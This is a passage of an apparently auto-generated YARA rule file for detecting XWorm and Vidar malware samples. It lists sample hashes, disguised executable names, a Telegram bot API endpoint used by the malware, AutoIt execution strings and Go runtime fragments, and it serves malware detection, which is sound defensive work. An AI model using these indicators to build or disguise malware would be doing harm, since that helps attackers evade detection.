      $s4 = "nYzZl3AdENVBIdEjtTSIALOgFmiuC" fullword ascii /* score: '9.00'*/
      $s5 = "q0MSo9kcehQovSioaRjHt15fJgLNhRTxnuZ4grzYvJgEth9i9ptn42gFUktW8MfI8OVgjCNHQEnRzjoFcp" fullword ascii /* score: '9.00'*/
      $s6 = "fcuiTWJsoP0CPeF6qEGJglX9AywKi" fullword ascii /* score: '9.00'*/
      $s7 = "fmsf9WhdrUjLYl0Ym42bQJ8ohDG9KPpU0QEub0ylmvTPR4LFNXy28KOdojBk5YmJgeToQKWvDviOsgKNYK1pejB" fullword ascii /* score: '9.00'*/
      $s8 = "nT0DEwx5BK53PGKSFEN7eWZBRPIwx9ZY0vMndLl1l0ILeof6k7411bbtOdED4GpBqsAQHYfOo00UzzhV07" fullword ascii /* score: '9.00'*/
      $s9 = "Qui5bWH8ypc3dPM2rEhMzLFTPkMhjbbbpo1DchCydLvKnmKVmdtVDMpCwXpLYWT3" fullword wide /* score: '9.00'*/
      $s10 = "BdIasFxmZwb5xwT4TuRlrOWxj7cjfh0fh83mbo3EmJPIg3Fs6aBIt3M7l9Lv7LOg" fullword wide /* score: '9.00'*/
      $s11 = "nursultan" fullword ascii /* score: '8.00'*/
      $s12 = "1JwTtugSMdHNK6NvvcsURFUqqsGzlKFRIrsyozMS35frk34YK75Y9ON423glo4cTOCOvLxjhutf5L1mlmWcTxWYE783MDuoFf" fullword wide /* score: '8.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 300KB and
      8 of them
}

rule XWorm_signature__f34d5f2d4577ed6d9ceec516c1f5a744_imphash__ab82ee46 {
   meta:
      description = "_subset_batch - file XWorm(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_ab82ee46.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "ab82ee4628e3c5b8f5b9708bfda88eb20533e07369936e7a188382d2a3ae64b8"
   strings:
      $s1 = "Winmedia.exe" fullword wide /* score: '22.00'*/
      $s2 = "https://api.telegram.org/bot" fullword wide /* score: '10.00'*/
      $s3 = "yTftpFm5SfrG3szs3gJaWjkYVyncsWIsN4ldKmQHDeef1Zde6vvJf9PUoQexnF0U6d" fullword ascii /* score: '9.00'*/
      $s4 = "<<<3:::0@@@,>>>)>>>%<<<\"<<<" fullword ascii /* score: '9.00'*/ /* hex encoded string '0' */
      $s5 = "xQ9cHOvbxjKP0cKDcZdG8nladHCZwdLVZzQKpSYAxUoElpB4B0xGTjRor2wL1xn" fullword wide /* score: '9.00'*/
      $s6 = "SCsn0yHd7KCoDtUkytX70EkkakNrG6PHSRs5UJU7NP0ccxVY0B4pbFjCGan0WJxwxrMSWow2isfXuzPHFOPsryiqaG" fullword wide /* score: '9.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 400KB and
      all of them
}

rule XWorm_signature__f34d5f2d4577ed6d9ceec516c1f5a744_imphash__c9944f21 {
   meta:
      description = "_subset_batch - file XWorm(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_c9944f21.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "c9944f21b713ca870d489827e424c7e5076c8f614fb64bfa0e73b7912d38de4c"
   strings:
      $s1 = "Warmz5569.exe" fullword wide /* score: '22.00'*/
      $s2 = "ZJuBGQssi1F6upAjC65qHAIWmO7yBT2QCs1EYeQRYeQ12W4EtRJKb8fDT" fullword ascii /* score: '9.00'*/
      $s3 = "UGTS0I4rY6IrC22fy" fullword wide /* score: '9.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 200KB and
      all of them
}

rule XWorm_signature__f34d5f2d4577ed6d9ceec516c1f5a744_imphash__decb14d2 {
   meta:
      description = "_subset_batch - file XWorm(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_decb14d2.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "decb14d2723338d090ae684105f1bb2e4f616ac37675390a443309ffee03e8c1"
   strings:
      $s1 = "XClient2.exe" fullword wide /* score: '22.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 100KB and
      all of them
}

rule XWorm_signature__f34d5f2d4577ed6d9ceec516c1f5a744_imphash__e0059f8d {
   meta:
      description = "_subset_batch - file XWorm(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_e0059f8d.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "e0059f8d6dfbf7bdddd47912c517a90d0c848ceb474445e920754ddb3119e902"
   strings:
      $s1 = "UEWjtYDcIv2vxwKbsYUzJYhoHyhIsvyjXonBp7gf6LzJdll22eohPwaSFg" fullword ascii /* score: '9.00'*/
      $s2 = "OzJaFlbgJVXi73iWaILV7pOStoj4b941z2bfExbDLPk4k5aRzmuTfr7" fullword ascii /* score: '9.00'*/
      $s3 = "sL3U1LjmRKSv6DXVyzF7wVxwLkdlloXuPXD9BV01EMV2tYEyNXX061CPNnnI3TXrzXa5A4shFwixWWSBP" fullword ascii /* score: '9.00'*/
      $s4 = "FL4liYf5JfItCgnKZeYzUinStUPbr0wTGkjI93eRsaxZMlogLN4FRuf" fullword ascii /* score: '9.00'*/
      $s5 = "YIrBk26XFYwtddgsZFMHTLOG8NJutSCyw" fullword ascii /* score: '9.00'*/
      $s6 = "KXFEQZ2gqc5xu62kKmEdrdpNJrwbmvjgE1EHD3GNMtAQ8EYETK25WB4NXd" fullword ascii /* score: '9.00'*/
      $s7 = "ETF9YeoSkoUCbLTmfJCWojsHiSAMHDCQEAfUbhXBSO2YClfZJcFqntoVbK" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 200KB and
      all of them
}

rule XWorm_signature__f34d5f2d4577ed6d9ceec516c1f5a744_imphash__e47b4e99 {
   meta:
      description = "_subset_batch - file XWorm(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_e47b4e99.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "e47b4e9951b1275314efd8c4a67fa9af286f381a9cd9ce2ca0537cbee2005418"
   strings:
      $s1 = "DirectX.exe" fullword wide /* score: '22.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 100KB and
      all of them
}

rule XWorm_signature__f34d5f2d4577ed6d9ceec516c1f5a744_imphash__f03cc966 {
   meta:
      description = "_subset_batch - file XWorm(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_f03cc966.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "f03cc966d2abcece5e21a8c90cb2ae5472971202377c59187821f3188012d992"
   strings:
      $s1 = "XWormCli33ent.exe" fullword wide /* score: '22.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 100KB and
      all of them
}

/* Super Rules ------------------------------------------------------------- */

rule _Vidar_signature__c4b185fc6a9ca983e00f1684a13ef4e1_imphash__XWorm_signature__2ac0df3cb49d714c81e70b5b92c304f2_imphash__0 {
   meta:
      description = "_subset_batch - from files Vidar(signature)_c4b185fc6a9ca983e00f1684a13ef4e1(imphash).exe, XWorm(signature)_2ac0df3cb49d714c81e70b5b92c304f2(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "fa346f12fbf02f7c7a9d81366d832cc505644089363ae7120d238a85f7ddff1f"
      hash2 = "7ebf3abd2208ff479bd6b3a546833f757c90519c377ef13a7f08549d6d32437a"
   strings:
      $s1 = "44444444444444444444444444444444444444" ascii /* score: '17.00'*/ /* hex encoded string 'DDDDDDDDDDDDDDDDDDD' */
      $s2 = "5B5B555555" ascii /* score: '17.00'*/ /* hex encoded string '[[UUU' */
      $s3 = "4444444444444444444444444444444444" ascii /* score: '17.00'*/ /* hex encoded string 'DDDDDDDDDDDDDDDDD' */
      $s4 = "2224447464474420" ascii /* score: '17.00'*/ /* hex encoded string '"$DtdGD ' */
      $s5 = "4444444444444444444444444444" ascii /* score: '17.00'*/ /* hex encoded string 'DDDDDDDDDDDDDD' */
      $s6 = "22244447474442" ascii /* score: '17.00'*/ /* hex encoded string '"$DGGDB' */
      $s7 = "4222442420" ascii /* score: '17.00'*/ /* hex encoded string 'B"D$ ' */
      $s8 = "/L language ID</S Hide intialization dialog.  For silent mode use: /S /v/qn" fullword wide /* score: '13.00'*/
      $s9 = "  ! \"!!&&+//.202440.,,'(&&&(,&+&'&(&'&(&&'&(&'(&''((&(&(&'(&('(&'(,&" fullword ascii /* score: '9.00'*/ /* hex encoded string ' $@' */
      $s10 = "     n" fullword ascii /* reversed goodware string 'n     ' */ /* score: '8.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 26000KB and ( all of them )
      ) or ( all of them )
}

rule _Vidar_signature__4035d2883e01d64f3e7a9dccb1d63af5_imphash__4bb04c7f_Vidar_signature__4035d2883e01d64f3e7a9dccb1d63af5_impha_1 {
   meta:
      description = "_subset_batch - from files Vidar(signature)_4035d2883e01d64f3e7a9dccb1d63af5(imphash)_4bb04c7f.exe, Vidar(signature)_4035d2883e01d64f3e7a9dccb1d63af5(imphash)_553e38e8.exe, Vidar(signature)_91802a615b3a5c4bcc05bc5f66a5b219(imphash).exe, Vidar(signature)_d42595b695fc008ef2c56aabd8efd68e(imphash).exe, XWorm(signature)_4035d2883e01d64f3e7a9dccb1d63af5(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "4bb04c7fce48557862f9f8b5001e669bafd79cabebc57cef099fab4c4a748efc"
      hash2 = "553e38e8f39f6e564cf7f35bc103e851954f7bbcebeab647853cc3640f882b23"
      hash3 = "fbe61e458f558ee98c0edd7acfa28cbac26f750c2481e6cb796ce3f536d3a009"
      hash4 = "a199cf92ab2e5ba8ebfaa2a8f71d9db06160a96fd4286cd8efe12bccdd0364e9"
      hash5 = "3433ac1f8c27e6e4bf4f2482dbc6e9af1ee91e8221c9243a9504696f2c4617f7"
   strings:
      $s1 = "      <dpiAware xmlns=\"http://schemas.microsoft.com/SMI/2005/WindowsSettings\">true/pm</dpiAware> <!-- legacy -->" fullword ascii /* score: '25.00'*/
      $s2 = "runtime.getempty.func1" fullword ascii /* score: '22.00'*/
      $s3 = "runtime.getempty" fullword ascii /* score: '22.00'*/
      $s4 = "runtime.execute" fullword ascii /* score: '21.00'*/
      $s5 = "runtime.dumpregs" fullword ascii /* score: '20.00'*/
      $s6 = "runtime.injectglist" fullword ascii /* score: '20.00'*/
      $s7 = "runtime.dumpgstatus" fullword ascii /* score: '20.00'*/
      $s8 = "runtime.tracebackHexdump" fullword ascii /* score: '20.00'*/
      $s9 = "runtime.gcDumpObject" fullword ascii /* score: '20.00'*/
      $s10 = "runtime.hexdumpWords" fullword ascii /* score: '20.00'*/
      $s11 = "runtime.tracebackHexdump.func1" fullword ascii /* score: '20.00'*/
      $s12 = "*runtime.mutex" fullword ascii /* score: '18.00'*/
      $s13 = "runtime.(*rwmutex).rlock.func1" fullword ascii /* score: '18.00'*/
      $s14 = "runtime.(*rwmutex).runlock" fullword ascii /* score: '18.00'*/
      $s15 = "runtime.(*rwmutex).rlock" fullword ascii /* score: '18.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 8000KB and ( 8 of them )
      ) or ( all of them )
}

rule _Vidar_signature__4035d2883e01d64f3e7a9dccb1d63af5_imphash__4bb04c7f_Vidar_signature__4035d2883e01d64f3e7a9dccb1d63af5_impha_2 {
   meta:
      description = "_subset_batch - from files Vidar(signature)_4035d2883e01d64f3e7a9dccb1d63af5(imphash)_4bb04c7f.exe, Vidar(signature)_4035d2883e01d64f3e7a9dccb1d63af5(imphash)_553e38e8.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "4bb04c7fce48557862f9f8b5001e669bafd79cabebc57cef099fab4c4a748efc"
      hash2 = "553e38e8f39f6e564cf7f35bc103e851954f7bbcebeab647853cc3640f882b23"
   strings:
      $x1 = "object is remotepacer: H_m_prev=reflect mismatchremote I/O errorruntime:  g:  g=runtime: addr = runtime: base = runtime: gp: gp=" ascii /* score: '61.00'*/
      $x2 = " to unallocated span37252902984619140625Arabic Standard TimeAzores Standard TimeCertOpenSystemStoreWCreateProcessAsUserWCryptAcq" ascii /* score: '58.00'*/
      $x3 = "slice bounds out of range [:%x] with length %ystopTheWorld: not stopped (status != _Pgcstop)sysGrow bounds not aligned to palloc" ascii /* score: '50.00'*/
      $x4 = "0123456789abcdefghijklmnopqrstuvwxyz444089209850062616169452667236328125Go pointer stored into non-Go memoryUnable to determine " ascii /* score: '50.00'*/
      $x5 = "unknown pcws2_32.dll  of size   (targetpc= KiB work,  freeindex= gcwaiting= heap_live= idleprocs= in status  mallocing= ms clock" ascii /* score: '47.00'*/
      $x6 = " > (den<<shift)/2unreserving unaligned region45474735088646411895751953125Central America Standard TimeCentral Pacific Standard " ascii /* score: '46.00'*/
      $x7 = ".lib section in a.out corrupted11368683772161602973937988281255684341886080801486968994140625Central Brazilian Standard TimeMoun" ascii /* score: '44.50'*/
      $x8 = "152587890625762939453125Bidi_ControlErrUnknownPCGetAddrInfoWGetConsoleCPGetLastErrorGetLengthSidGetStdHandleGetTempPathWJoin_Con" ascii /* score: '44.00'*/
      $x9 = "lock: lock countslice bounds out of rangesocket type not supportedstartm: p has runnable gsstoplockedm: not runnableunexpected f" ascii /* score: '44.00'*/
      $x10 = "structure needs cleaningzlib: invalid dictionary bytes failed with errno= to unused region of span with too many arguments 29103" ascii /* score: '35.00'*/
      $x11 = "rmask.lockentersyscallblockexec format errorg already scannedglobalAlloc.mutexinvalid bit size locked m0 woke upmark - bad statu" ascii /* score: '33.00'*/
      $x12 = "entersyscallgcBitsArenasgcpacertracehost is downillegal seekinvalid slotiphlpapi.dllkernel32.dlllfstack.pushmadvdontneedmheapSpe" ascii /* score: '33.00'*/
      $x13 = "476837158203125<invalid Value>ASCII_Hex_DigitCreateHardLinkWDeviceIoControlDuplicateHandleFailed to find Failed to load FlushVie" ascii /* score: '32.00'*/
      $s14 = "-struct typeruntime: VirtualQuery failed; errno=runtime: bad notifyList size - sync=runtime: invalid pc-encoded table f=runtime:" ascii /* score: '30.00'*/
      $s15 = "mstartbad sequence numberbad value for fieldbinary.LittleEndiandevice not a streamdirectory not emptydisk quota exceededdodeltim" ascii /* score: '30.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 7000KB and pe.imphash() == "4035d2883e01d64f3e7a9dccb1d63af5" and ( 1 of ($x*) and all of them )
      ) or ( all of them )
}

rule _XWorm_signature__112bfbb18727302cb5425c20a464b02e_imphash__80d931d6_XWorm_signature__75d930149d98b9b34c55459c6a79b293_impha_3 {
   meta:
      description = "_subset_batch - from files XWorm(signature)_112bfbb18727302cb5425c20a464b02e(imphash)_80d931d6.exe, XWorm(signature)_75d930149d98b9b34c55459c6a79b293(imphash)_89c42dfb.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "80d931d6ce4b435d4d3486d0330733777d82d0ec15966bfa4f4acf8ffc76a449"
      hash2 = "89c42dfbb05f7be8162e2db485ff2d70faed81989a73de3f01499446946c67ac"
   strings:
      $x1 = "win32\" name=\"Microsoft.Windows.Common-Controls\" version=\"6.0.0.0\" processorArchitecture=\"*\" publicKeyToken=\"6595b64144cc" ascii /* score: '36.00'*/
      $x2 = "api-ms-win-downlevel-shell32-l1-1-0.dll" fullword wide /* reversed goodware string 'lld.0-1-1l-23llehs-levelnwod-niw-sm-ipa' */ /* score: '35.00'*/
      $s3 = "erundll32.exe" fullword wide /* score: '26.00'*/
      $s4 = "v8.execute" fullword ascii /* score: '18.00'*/
      $s5 = "failed to read header" fullword ascii /* score: '17.00'*/
      $s6 = "Windows.PostOperationState." fullword ascii /* score: '17.00'*/
      $s7 = "Crashpad.CrashUpload.AttemptSuccessful" fullword ascii /* score: '16.00'*/
      $s8 = "process_uptime_seconds" fullword ascii /* score: '15.00'*/
      $s9 = "CloseHandle process" fullword ascii /* score: '15.00'*/
      $s10 = "ProcessMemoryMetrics" fullword ascii /* score: '15.00'*/
      $s11 = "VizProcessContextProvider" fullword ascii /* score: '15.00'*/
      $s12 = "failed to write header" fullword ascii /* score: '14.00'*/
      $s13 = "download_service" fullword ascii /* score: '13.00'*/
      $s14 = "TransactNamedPipe: expected " fullword ascii /* score: '13.00'*/
      $s15 = "Windows.FilesystemError." fullword ascii /* score: '13.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 8000KB and ( 1 of ($x*) and 4 of them )
      ) or ( all of them )
}

rule _Worm_Mo_ksys_signature__1895460fffad9475fda0c84755ecfee1_imphash__XWorm_signature__1895460fffad9475fda0c84755ecfee1_imphash_4 {
   meta:
      description = "_subset_batch - from files Worm.Mo-ksys(signature)_1895460fffad9475fda0c84755ecfee1(imphash).exe, XWorm(signature)_1895460fffad9475fda0c84755ecfee1(imphash).exe, XWorm(signature)_1895460fffad9475fda0c84755ecfee1(imphash)_f78a4b9f.exe, XWorm(signature)_6c9794990dcbb89d798ebf671bb8138f(imphash).exe, XWorm(signature)_6c9794990dcbb89d798ebf671bb8138f(imphash)_15da3c7d.exe, XWorm(signature)_6c9794990dcbb89d798ebf671bb8138f(imphash)_1c98c6ea.exe, XWorm(signature)_6c9794990dcbb89d798ebf671bb8138f(imphash)_21506f86.exe, XWorm(signature)_6c9794990dcbb89d798ebf671bb8138f(imphash)_39fa269c.exe, XWorm(signature)_6c9794990dcbb89d798ebf671bb8138f(imphash)_48c12ced.exe, XWorm(signature)_6c9794990dcbb89d798ebf671bb8138f(imphash)_bb007b8f.exe, XWorm(signature)_6c9794990dcbb89d798ebf671bb8138f(imphash)_be98ff07.exe, XWorm(signature)_91d07a5e22681e70764519ae943a5883(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "89294d5c1a033154e10fd604877db9a4b80f48bde81b1c72639fe36fbf0c224a"
      hash2 = "c9eafb27a205336cacc59320dc6679381efd45f51679072c961d34dd18cf6b38"
      hash3 = "f78a4b9fa0ff5147d158e0fe48daf3b6b8f2de9e9e8b824d70c6af392e489487"
      hash4 = "019c339f27fa9ee15ec44e019f7dcba70341dec837166971242873840cdc0bb8"
      hash5 = "15da3c7d89995b5948be27e62cc19ec8aafb0023a190092a441b48fbbdc0b21f"
      hash6 = "1c98c6ea044fe97627ddcb19caae12f1c6db0bde22054c4741834a50cc3ba331"
      hash7 = "21506f8672c5eef89d53616ddd7966a701230713f25b5362b39f89f5058aa99d"
      hash8 = "39fa269cf1746bd6e17c3d371b808042f6f559e314a904b58a93bad41aa23795"
      hash9 = "48c12ced2bc10497c8498bf48485db960d3c65e67479f61cf9f8ccc5511ceff1"
      hash10 = "bb007b8f9ae167ba277b29f3029c01046c8c52f4fa3fe2015e7a8669a356e239"
      hash11 = "be98ff07443e154fac50b759d1dfc0eb149aca4a0a13b35788cc0a542763249e"
      hash12 = "c1fee50315e13d315ba968892ccdb7af6287c78c16a3ba7ec16e0f6047c8ea10"
   strings:
      $s1 = "<assemblyIdentity type=\"win32\" name=\"Microsoft.Windows.Common-Controls\" version=\"6.0.0.0\" language=\"*\" processorArchitec" ascii /* score: '26.00'*/
      $s2 = "/AutoIt3ExecuteScript" fullword wide /* PEStudio Blacklist: strings */ /* score: '26.00'*/
      $s3 = "/AutoIt3ExecuteLine" fullword wide /* PEStudio Blacklist: strings */ /* score: '23.00'*/
      $s4 = "PROCESSGETSTATS" fullword wide /* score: '22.50'*/
      $s5 = "WINGETPROCESS" fullword wide /* score: '22.50'*/
      $s6 = "SCRIPTNAME" fullword wide /* base64 encoded string */ /* score: '22.50'*/
      $s7 = "SHELLEXECUTEWAIT" fullword wide /* PEStudio Blacklist: strings */ /* score: '21.50'*/
      $s8 = "SHELLEXECUTE" fullword wide /* PEStudio Blacklist: strings */ /* score: '21.50'*/
      $s9 = "*Unable to get a list of running processes." fullword wide /* score: '20.00'*/
      $s10 = "PROCESSSETPRIORITY" fullword wide /* score: '17.50'*/
      $s11 = "HTTPSETUSERAGENT" fullword wide /* score: '17.50'*/
      $s12 = "PROCESSWAITCLOSE" fullword wide /* score: '17.50'*/
      $s13 = "PROCESSEXISTS" fullword wide /* score: '17.50'*/
      $s14 = "PROCESSCLOSE" fullword wide /* score: '17.50'*/
      $s15 = "PROCESSWAIT" fullword wide /* score: '17.50'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 6000KB and ( 8 of them )
      ) or ( all of them )
}

rule _Vidar_signature__4035d2883e01d64f3e7a9dccb1d63af5_imphash__4bb04c7f_Vidar_signature__4035d2883e01d64f3e7a9dccb1d63af5_impha_5 {
   meta:
      description = "_subset_batch - from files Vidar(signature)_4035d2883e01d64f3e7a9dccb1d63af5(imphash)_4bb04c7f.exe, Vidar(signature)_4035d2883e01d64f3e7a9dccb1d63af5(imphash)_553e38e8.exe, Vidar(signature)_d42595b695fc008ef2c56aabd8efd68e(imphash).exe, XWorm(signature)_4035d2883e01d64f3e7a9dccb1d63af5(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "4bb04c7fce48557862f9f8b5001e669bafd79cabebc57cef099fab4c4a748efc"
      hash2 = "553e38e8f39f6e564cf7f35bc103e851954f7bbcebeab647853cc3640f882b23"
      hash3 = "a199cf92ab2e5ba8ebfaa2a8f71d9db06160a96fd4286cd8efe12bccdd0364e9"
      hash4 = "3433ac1f8c27e6e4bf4f2482dbc6e9af1ee91e8221c9243a9504696f2c4617f7"
   strings:
      $s1 = "runtime.mutexprofilerate" fullword ascii /* score: '21.00'*/
      $s2 = "runtime.processorVersionInfo" fullword ascii /* score: '21.00'*/
      $s3 = "os.Executable" fullword ascii /* score: '20.00'*/
      $s4 = "runtime.injectglist.func1" fullword ascii /* score: '20.00'*/
      $s5 = "internal/poll.logInitFD" fullword ascii /* score: '19.00'*/
      $s6 = "runtime.execLock" fullword ascii /* score: '19.00'*/
      $s7 = "runtime/rwmutex.go" fullword ascii /* score: '18.00'*/
      $s8 = "runtime.printBacklogIndex" fullword ascii /* score: '18.00'*/
      $s9 = "os.executable" fullword ascii /* score: '16.00'*/
      $s10 = "runtime.hashkey" fullword ascii /* score: '16.00'*/
      $s11 = "os.commandLineToArgv" fullword ascii /* score: '16.00'*/
      $s12 = "runtime.errorAddressString.Error" fullword ascii /* score: '16.00'*/
      $s13 = "internal/poll.execIO" fullword ascii /* score: '16.00'*/
      $s14 = "*syscall.DLL" fullword ascii /* score: '16.00'*/
      $s15 = "internal/poll.(*fdMutex).rwlock" fullword ascii /* score: '15.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 8000KB and ( 8 of them )
      ) or ( all of them )
}

rule _Vidar_signature__4035d2883e01d64f3e7a9dccb1d63af5_imphash__4bb04c7f_Vidar_signature__4035d2883e01d64f3e7a9dccb1d63af5_impha_6 {
   meta:
      description = "_subset_batch - from files Vidar(signature)_4035d2883e01d64f3e7a9dccb1d63af5(imphash)_4bb04c7f.exe, Vidar(signature)_4035d2883e01d64f3e7a9dccb1d63af5(imphash)_553e38e8.exe, Vidar(signature)_d42595b695fc008ef2c56aabd8efd68e(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "4bb04c7fce48557862f9f8b5001e669bafd79cabebc57cef099fab4c4a748efc"
      hash2 = "553e38e8f39f6e564cf7f35bc103e851954f7bbcebeab647853cc3640f882b23"
      hash3 = "a199cf92ab2e5ba8ebfaa2a8f71d9db06160a96fd4286cd8efe12bccdd0364e9"
   strings:
      $s1 = "reflect.Value.Complex" fullword ascii /* score: '14.00'*/
      $s2 = "runtime.nilinterhash" fullword ascii /* score: '13.00'*/
      $s3 = "runtime.mapassign_fast64" fullword ascii /* score: '13.00'*/
      $s4 = "runtime.mapassign_fast64ptr" fullword ascii /* score: '13.00'*/
      $s5 = "runtime.expandCgoFrames" fullword ascii /* score: '13.00'*/
      $s6 = "unicode.FoldScript" fullword ascii /* score: '13.00'*/
      $s7 = "runtime.interhash" fullword ascii /* score: '13.00'*/
      $s8 = "runtime.typehash" fullword ascii /* score: '13.00'*/
      $s9 = "debug/pe.readOptionalHeader.func1" fullword ascii /* score: '12.00'*/
      $s10 = "debug/pe.readOptionalHeader" fullword ascii /* score: '12.00'*/
      $s11 = "unicode.foldLl" fullword ascii /* score: '12.00'*/
      $s12 = "ReaderAt" fullword ascii /* score: '12.00'*/
      $s13 = "main.GetRelocTable" fullword ascii /* score: '12.00'*/
      $s14 = "sync.(*Pool).Get" fullword ascii /* score: '12.00'*/
      $s15 = "fmt.getField" fullword ascii /* score: '12.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 8000KB and ( 8 of them )
      ) or ( all of them )
}

rule _Vidar_signature__4035d2883e01d64f3e7a9dccb1d63af5_imphash__4bb04c7f_Vidar_signature__4035d2883e01d64f3e7a9dccb1d63af5_impha_7 {
   meta:
      description = "_subset_batch - from files Vidar(signature)_4035d2883e01d64f3e7a9dccb1d63af5(imphash)_4bb04c7f.exe, Vidar(signature)_4035d2883e01d64f3e7a9dccb1d63af5(imphash)_553e38e8.exe, Vidar(signature)_91802a615b3a5c4bcc05bc5f66a5b219(imphash).exe, XWorm(signature)_4035d2883e01d64f3e7a9dccb1d63af5(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "4bb04c7fce48557862f9f8b5001e669bafd79cabebc57cef099fab4c4a748efc"
      hash2 = "553e38e8f39f6e564cf7f35bc103e851954f7bbcebeab647853cc3640f882b23"
      hash3 = "fbe61e458f558ee98c0edd7acfa28cbac26f750c2481e6cb796ce3f536d3a009"
      hash4 = "3433ac1f8c27e6e4bf4f2482dbc6e9af1ee91e8221c9243a9504696f2c4617f7"
   strings:
      $s1 = "= flushGen  gfreecnt= pages at  runqsize= runqueue= s.base()= spinning= stopwait= sweepgen  sweepgen= targetpc= throwing= until " ascii /* score: '22.00'*/
      $s2 = "sync.runtime_SemacquireMutex" fullword ascii /* score: '21.00'*/
      $s3 = "i32.dll" fullword ascii /* score: '20.00'*/
      $s4 = "rof.dll" fullword ascii /* score: '20.00'*/
      $s5 = "runtime.hexdumpWords.func1" fullword ascii /* score: '20.00'*/
      $s6 = "l32.dll" fullword ascii /* score: '20.00'*/
      $s7 = "dwprocessortype" fullword ascii /* score: '19.00'*/
      $s8 = "wprocessorrevision" fullword ascii /* score: '19.00'*/
      $s9 = "dwactiveprocessormask" fullword ascii /* score: '19.00'*/
      $s10 = "dwnumberofprocessors" fullword ascii /* score: '19.00'*/
      $s11 = "wprocessorlevel" fullword ascii /* score: '19.00'*/
      $s12 = "runtime: bad pointer in frame runtime: found in object at *(runtime: impossible type kind socket operation on non-socketsync: in" ascii /* score: '18.00'*/
      $s13 = "*runtime.rwmutex" fullword ascii /* score: '18.00'*/
      $s14 = "**struct { F uintptr; rw *runtime.rwmutex }" fullword ascii /* score: '18.00'*/
      $s15 = "_32.dll" fullword ascii /* score: '17.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 7000KB and ( 8 of them )
      ) or ( all of them )
}

rule _Vidar_signature__4035d2883e01d64f3e7a9dccb1d63af5_imphash__4bb04c7f_Vidar_signature__4035d2883e01d64f3e7a9dccb1d63af5_impha_8 {
   meta:
      description = "_subset_batch - from files Vidar(signature)_4035d2883e01d64f3e7a9dccb1d63af5(imphash)_4bb04c7f.exe, Vidar(signature)_4035d2883e01d64f3e7a9dccb1d63af5(imphash)_553e38e8.exe, XWorm(signature)_4035d2883e01d64f3e7a9dccb1d63af5(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "4bb04c7fce48557862f9f8b5001e669bafd79cabebc57cef099fab4c4a748efc"
      hash2 = "553e38e8f39f6e564cf7f35bc103e851954f7bbcebeab647853cc3640f882b23"
      hash3 = "3433ac1f8c27e6e4bf4f2482dbc6e9af1ee91e8221c9243a9504696f2c4617f7"
   strings:
      $s1 = "bad defer entry in panicbad defer size class: i=bypassed recovery failedcan't scan our own stackconnection reset by peerdouble t" ascii /* score: '22.00'*/
      $s2 = "unknown pcws2_32.dll  of size   (targetpc= KiB work,  freeindex= gcwaiting= heap_live= idleprocs= in status  mallocing= ms clock" ascii /* score: '21.00'*/
      $s3 = "e nmspinninginvalid runtime symbol tablemheap.freeSpanLocked - span missing stack in shrinkstackmspan.sweep: m is not lockednewp" ascii /* score: '20.00'*/
      $s4 = "syscall.procGetCurrentProcess" fullword ascii /* score: '19.00'*/
      $s5 = "cialmspanSpecialnetapi32.dllnot pollableraceFiniLockreleasep: m=runtime: gp=runtime: sp=self-preemptshort bufferspanSetSpineswee" ascii /* score: '19.00'*/
      $s6 = "syscall.procGetProcessTimes" fullword ascii /* score: '19.00'*/
      $s7 = "syscall.procGetCurrentProcessId" fullword ascii /* score: '19.00'*/
      $s8 = "morebuf={pc:advertise errorasyncpreemptoffforce gc (idle)key has expiredmalloc deadlockmisaligned maskmissing mcache?ms: gomaxpr" ascii /* score: '19.00'*/
      $s9 = "syscall.procGetExitCodeProcess" fullword ascii /* score: '19.00'*/
      $s10 = "roc1: new g is not Gdeadnewproc1: newg missing stackos: process already finishedprotocol driver not attachedreflect: In of non-f" ascii /* score: '18.00'*/
      $s11 = "?*struct { lock runtime.mutex; used uint32; fn func(bool) bool }" fullword ascii /* score: '18.00'*/
      $s12 = "ocs=network is downno medium foundno such processrecovery failedruntime error: runtime: frame runtime: max = runtime: min = runt" ascii /* score: '18.00'*/
      $s13 = "syscall.procOpenProcessToken" fullword ascii /* score: '17.00'*/
